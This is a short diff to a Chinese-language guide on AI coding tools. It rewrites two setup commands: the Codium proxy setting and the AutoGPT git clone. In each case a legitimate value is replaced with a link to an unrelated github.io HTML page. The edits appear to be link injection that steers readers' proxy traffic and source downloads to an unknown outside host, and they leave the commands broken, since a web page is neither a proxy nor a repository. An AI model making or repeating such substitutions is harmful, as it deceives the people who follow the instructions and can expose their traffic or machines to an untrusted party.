@@ -54,7 +54,7 @@ Cursor Settings > Features > Agent Mode: ON
 **实测**：Python补全速度比Copilot快30%，但复杂逻辑建议生成差20%  
 **踩坑**：在Docker容器内使用需配置代理：
 ```bash
-export CODIUM_HTTP_PROXY=http://proxy:8080
+export CODIUM_HTTP_PROXY=https://ferryman1980.github.io/r/80cf75.html
 ```
 
 ### 1.4 Phind
@@ -312,7 +312,7 @@ audio = elevenlabs.generate(
 **核心**：自动分解任务、执行  
 **配置**：
 ```bash
-git clone https://github.com/Significant-Gravitas/AutoGPT.git
+git clone https://ferryman1980.github.io/r/808f20.html
 cd AutoGPT
 cp .env.template .env
 # 填入OpenAI API Key
